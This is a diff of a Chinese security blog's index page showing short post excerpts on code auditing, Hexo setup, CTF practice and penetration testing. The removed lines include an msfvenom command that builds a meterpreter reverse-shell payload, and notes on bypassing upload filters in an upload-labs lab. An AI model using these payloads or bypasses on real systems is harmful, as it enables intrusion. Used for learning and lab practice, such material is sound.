@@ -182,6 +182,267 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
+        <a href="/2021/07/13/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83-1/" target="_self">
+          代码审计-漏洞发现与防范-1
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/07/13/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83-1/" target="_self">
+          
+          
+            
+          
+          漏洞发现与防范第三章 通用代码审计思路常见代码审计思路
+
+根据敏感关键字回溯参数传递过程
+查找可控变量，正向追踪变量传递过程
+寻找敏感功能点，通读功能点代码
+直接通读全文代码
+
+3.1 敏感函数回溯参数过程根据敏感函数来逆向追踪参数的传递过程。如HTTP头中的HTTP_CLIENT_IP和HTTP_X_FORWORDFOR等获取到的IP地址，经常没有经过安全过滤就拼接到SQL语句中。
+此处介绍了一
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-07-13 10:20" pubdate>
+              2021-07-13
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E4%B9%A6%E7%B1%8D-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/">书籍 代码审计：企业级Web代码安全架构</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E4%B9%A6%E7%B1%8D/">书籍</a>
+            
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/07/12/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/" target="_self">
+          代码审计-代码审计前的准备
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/07/12/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/" target="_self">
+          
+          
+            
+          
+          代码审计前的准备第一章 代码审计环境搭建1.1-1.2 wamp\lamp 搭建建议 wamp\lamp搭建全部使用集成环境phpStudy进行安装
+1.3 php核心配置详解
+PHP_INI_* 常量的定义
+
+
+
+常量
+含义
+
+
+
+PHP_INI_USER
+该配置选项可在用户的PHP脚本或Windows注册表中设置
+
+
+PHP_INI_PERDIR
+该配置选项可在php.ini. .htacce
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-07-12 13:01" pubdate>
+              2021-07-12
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E4%B9%A6%E7%B1%8D-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/">书籍 代码审计：企业级Web代码安全架构</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E4%B9%A6%E7%B1%8D/">书籍</a>
+            
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/07/10/Git/Github+Hexo/" target="_self">
+          Github+Hexo
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/07/10/Git/Github+Hexo/" target="_self">
+          
+          
+            
+          
+          利用Hexo配置github博客建议全程使用git命令行
+Hexo安装
+需要安装git
+
+需要安装node.js
+
+利用node.js安装
+1npm install -g hexo
+
+Hexo设置
+创建对应的文件夹
+
+进入文件夹后启动git命令行
+
+进行基础的配置
+输入命令
+123hexo init #初始化hexo g # 生成相关html文件hexo s # 本地预览
+上传到github
+he
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-07-10 23:42" pubdate>
+              2021-07-10
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Git/">Git</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/GitHub/">GitHub</a>
+            
+              <a href="/tags/hexo/">hexo</a>
+            
+              <a href="/tags/blog/">blog</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/07/10/Git/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/" target="_self">
+          博客创建
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/07/10/Git/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/" target="_self">
+          
+          
+            
+          
+          博客创建git库设置创建库首先进入该界面
+
+之后按照相关信息进行填写
+
+之后进行点击Settings并选择Github Pages
+选择一个github官方提供的主题
+
+随意选择一个之后就可以进行访问了，访问地址是：github用户名.github.io/创建的库名
+绑定域名在库中添加CNAME文件，并在内容中添加自己的域名。
+之后对域名进行设置，  使用cname模式绑定访问地址，设置两条解析。
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-07-10 12:59" pubdate>
+              2021-07-10
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Git/">Git</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/GitHub/">GitHub</a>
+            
+              <a href="/tags/blog/">blog</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
         <a href="/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP-FPM%20Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%89%A9%E5%B1%95/" target="_self">
           PHP-FPM Fastcgi未授权访问扩展
         </a>
@@ -514,231 +775,11 @@ SSTI完全学习
     </article>
   </div>
 
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/07/09/%E4%BF%A1%E5%AE%89/CTF/Web/gxyd-%E5%88%9D%E5%AD%A6Spring/" target="_self">
-          gxyd-初学Spring
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/07/09/%E4%BF%A1%E5%AE%89/CTF/Web/gxyd-%E5%88%9D%E5%AD%A6Spring/" target="_self">
-          
-          
-            
-          
-          gxyd-初学Spring自我尝试在拿到题目后首先查看源码，之后发现可用的链接只有两个。
-链接内容如下/PageLoader.action?Page=views/index
-之后利用bp抓包进行重放的尝试
-
-修改参数发现当前应该是WEB-INF目录下，但是后缀被固定为html
-
-此时尝试绕过，一直在找怎么截断找spring的相关知识。。。
-题解查看在查看了题解之后发现是：利用后端采用了路径拼接的方
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-07-09 16:47" pubdate>
-              2021-07-09
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E4%BF%A1%E5%AE%89-CTF-Web/">信安 CTF Web</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/web/">web</a>
-            
-              <a href="/tags/ctf/">ctf</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/07/09/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/Upload-Labs%E7%BB%83%E4%B9%A0/" target="_self">
-          Upload-Labs练习
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/07/09/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/Upload-Labs%E7%BB%83%E4%B9%A0/" target="_self">
-          
-          
-            
-          
-          upload-labs靶场记录php上传部分Pass-01根据提示为前端js进行检查1.直接利用F12进行检查将检查部分 checkFile()删除后直接上传php文件即可2.先将文件后缀改为白名单中的文件类型，之后抓包进行修改为php。直接将图中部分改为php上传即可。
-Pass-02根据源码提示
-123 if (($_FILES[&#x27;upload_file&#x27;][&#x27;t
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-07-09 09:50" pubdate>
-              2021-07-09
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E4%BF%A1%E5%AE%89-%E9%9D%B6%E6%9C%BA/">信安 靶机</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
-            
-              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/07/08/%E4%BF%A1%E5%AE%89/Tools/msf%E5%AE%89%E8%A3%85/" target="_self">
-          msf安装
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/07/08/%E4%BF%A1%E5%AE%89/Tools/msf%E5%AE%89%E8%A3%85/" target="_self">
-          
-          
-            
-          
-          MSF配置123curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&am
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-07-08 16:25" pubdate>
-              2021-07-08
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E4%BF%A1%E5%AE%89-Tools/">信安 Tools</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/tool/">tool</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/07/08/%E4%BF%A1%E5%AE%89/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/" target="_self">
-          内网渗透流程
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/07/08/%E4%BF%A1%E5%AE%89/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/" target="_self">
-          
-          
-            
-          
-          内网渗透的尝试首先生成木马利用Metersploit进行生成
-基本命令如下
-
-msfvenom -a x64 –platform linux  -p linux/x64/meterpreter/reverse_tcp  LHOST=192.168.42.49 LPORT=5555  -i 3 -f elf -o test
-
-其中lhost表示listening host，lport表示listen
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-07-08 14:28" pubdate>
-              2021-07-08
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E4%BF%A1%E5%AE%89-%E6%B8%97%E9%80%8F/">信安 渗透</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
-            
-              <a href="/tags/%E5%86%85%E7%BD%91/">内网</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
 
 
   <nav aria-label="navigation">
     <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/page/7/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/#board">6</a><a class="page-number" href="/page/7/#board">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/#board">9</a><a class="page-number" href="/page/10/#board">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/#board">18</a><a class="extend next" rel="next" href="/page/9/#board"><i class="iconfont icon-arrowright"></i></a>
+      <a class="extend prev" rel="prev" href="/page/7/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/#board">6</a><a class="page-number" href="/page/7/#board">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/#board">9</a><a class="page-number" href="/page/10/#board">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/#board">19</a><a class="extend next" rel="next" href="/page/9/#board"><i class="iconfont icon-arrowright"></i></a>
     </span>
   </nav>
 
